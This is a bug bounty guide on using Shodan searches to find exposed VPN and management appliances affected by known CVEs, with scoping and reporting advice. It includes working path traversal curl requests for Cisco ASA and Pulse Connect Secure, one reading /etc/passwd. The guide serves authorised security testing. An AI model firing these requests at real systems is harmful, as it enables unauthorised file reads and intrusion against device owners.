# Shodan Dorks for Known CVEs

Shodan indexes banners of internet-exposed devices, so a targeted dork can fingerprint vulnerable appliances at scale — VPN concentrators, admin UIs, load balancers — often before their owners even know they're public. For bug bounty, this finds forgotten/exposed infrastructure of the target that port-scanning the main app never touches. Typical impact: known-CVE exposure of VPNs and management panels, i.e. pre-auth network-level compromise.

## Hunting Checklist

1. **Fingerprint the target's external estate** first — org ASN/IP ranges and domains via [Recon workflow](../Recon/Workflow.md); Shodan queries alone give you *devices*, you must tie them to *the target*.
2. **Run each dork below** (and Shodan's own CVE/tag searches) looking for matching banners.
3. **Filter results to the target**: `org:"<company>"`, `hostname:.target.com`, or match against your IP list — never test devices that merely look similar.
4. **Confirm the version** from the banner to check the CVE plausibility before probing.
5. **Validate the CVE with a single safe check** (see bypass section), then report — do not exploit.

## Dorks & Examples

```bash
# F5 BIG-IP redirector UI
shodan search 'http.title:"BIG-IP&reg;-Redirect" org:Org'

# CVE-2020-3452 — Cisco ASA path traversal (by page hash + cookie)
shodan search 'http.html_hash:-628873716 "set-cookie: webvpn;"'

# CVE-2019-11510 — Pulse Connect Secure arbitrary file read
shodan search 'http.html:/dana-na/'

# CVE-2020-5902 — F5 BIG-IP TMUI RCE
shodan search 'http.html:"/tmui/login.jsp"'
```

Safe (read-only) verification examples for the above devices:

```bash
# CVE-2020-3452 — read-only file fetch through the traversal; do NOT write/modify anything
curl -sk 'https://TARGET/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&path=/bin/ping6' | head -c 200

# CVE-2019-11510 — non-destructive known-file read
curl -sk 'https://TARGET/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'
```

## Bypass Techniques

- **Banner tricks / CDN in front:** filter by TLS cert SAN or `ssl:` fields rather than IP when the device sits behind a proxy.
- **Device patched but banner stale:** verify with the harmless read endpoint above instead of trusting version strings.
- **Shodan data is historical** — always re-check liveness yourself before reporting; add `before:`/`after:` filters or re-scan.

## Tools & Resources

- [Shodan CLI](https://github.com/shodan/shodan-cli) and https://www.shodan.io — search, filters (`org:`, `hostname:`, `http.html:`, `http.title:`, `http.html_hash:`)
- [Censys](https://censys.io) — second indexing source, better cert search
- Nuclei templates for the corresponding vulnerable products: https://github.com/projectdiscovery/nuclei-templates
- Related: [Easy CVEs workflow](../CVES/easycve.md), [Version leak](Version_Leak.md)

## Report Tips

- Prove **ownership** before reporting an exposed appliance: show cert/hostname/ASN evidence tying the IP to the program — this is the #1 triage blocker for Shodan findings.
- State the CVE, the banner evidence (Shodan result + your own re-verification screenshot), and the risk (VPN/management plane exposure = unauthenticated network access), without exploiting it.
- If the device is not in scope or third-party hosted, disclose responsibly through the right channel instead of testing.

## Author

- [@manasH4rsh](https://twitter.com/manasH4rsh)
- [Fani Malik](https://twitter.com/FaniMalikHack)
